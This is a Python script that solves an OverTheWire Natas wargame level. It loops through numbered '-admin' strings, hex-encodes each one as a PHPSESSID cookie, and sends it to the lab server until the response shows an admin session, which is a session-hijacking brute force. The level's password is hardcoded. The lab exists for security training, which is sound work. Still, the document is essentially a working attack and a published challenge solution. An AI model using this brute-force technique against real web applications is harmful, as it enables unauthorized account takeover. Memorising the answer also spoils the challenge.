# Import Library
import requests
import re
from string import *

# Setting variables needed
username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = f'http://{username}.natas.labs.overthewire.org/'
pw = []
flag = True
characters = ascii_letters + digits

# Connect to natas
session = requests.Session()
for i in range(1000):
    print(str(f'{i}-admin').encode('utf-8').hex())
    #The payload is unnecessary on this level
    payloads = {"username": 'admin', "password": 'aa'}
    #Changing session IDs to hex from string because admin is reconized by the session ID
    cookies = {"PHPSESSID" : str(f'{i}-admin').encode('utf-8').hex()}
    response = session.request('POST', url, auth=(username, password),
                                       data=payloads, cookies=cookies)
    if not re.findall("You are logged in as a regular user", response.text):
        print("Got It")
        print(response.text)
        break
